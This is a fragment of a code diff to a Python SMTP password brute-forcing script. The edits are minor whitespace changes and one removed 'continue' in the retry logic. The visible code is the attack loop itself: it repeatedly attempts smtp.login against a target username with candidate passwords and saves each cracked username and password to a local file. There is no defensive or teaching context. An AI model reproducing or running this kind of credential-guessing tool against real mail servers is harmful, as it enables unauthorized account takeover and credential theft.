@@ -63,6 +63,7 @@ def bruteforce():
 			smtp.ehlo()
 			smtp.starttls()
 			smtp.ehlo()
+
 		except socket.error:
 			print(Fore.RED + "[!] The server is incorrect")
 			return
@@ -77,14 +78,14 @@ def bruteforce():
 				print(Fore.WHITE + "----------------------------------------------------------") 
 				print(Fore.WHITE + "[+] " + Fore.RED + str(attempts) + "/3" + Fore.WHITE + " Trying " + Fore.YELLOW + "'" + password + "'"  + Fore.WHITE + " against " + Fore.WHITE + args.u)
 				print(Fore.WHITE + "----------------------------------------------------------") 
-										
+									
 				# Attempt to login.
 				smtp.login(args.u, password)
 
 # Write the cracked password to a file.
 				f = open('passwords/' + args.u, 'w')
 				f.write('username: '  + args.u + '\n')
-				f.write('password: ' + password + '\n')
+				f.write('password: '  + password + '\n')
 				f.close()
 
 				# Print thhe username & password out to the terminal.
@@ -107,7 +108,6 @@ def bruteforce():
 					smtp.ehlo()
 					smtp.starttls()
 					smtp.ehlo()
-					continue
 				else:
 
 					attempts = attempts + 1
